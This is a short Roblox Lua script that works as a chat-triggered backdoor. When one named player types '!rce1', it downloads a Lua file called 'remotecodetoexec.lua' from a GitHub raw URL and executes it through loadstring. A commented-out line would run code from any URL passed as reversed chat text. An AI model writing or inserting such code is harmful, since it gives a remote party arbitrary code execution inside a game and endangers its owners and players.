-- made by a silly person xdxd
--if game:GetService("CoreGui"):FindFirstChild('main11') then
-- game:GetService("CoreGui"):FindFirstChild('main11'):remove()
--end

game.Players.FilteringDisabledEz.Chatted:Connect(function(msg)
  if msg == "!rce1" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/unfunnylaugh/robloxstufflol/main/remotecodetoexec.lua"))()
  end
  --loadstring(game:HttpGet(string.reverse(msg)))()
end)
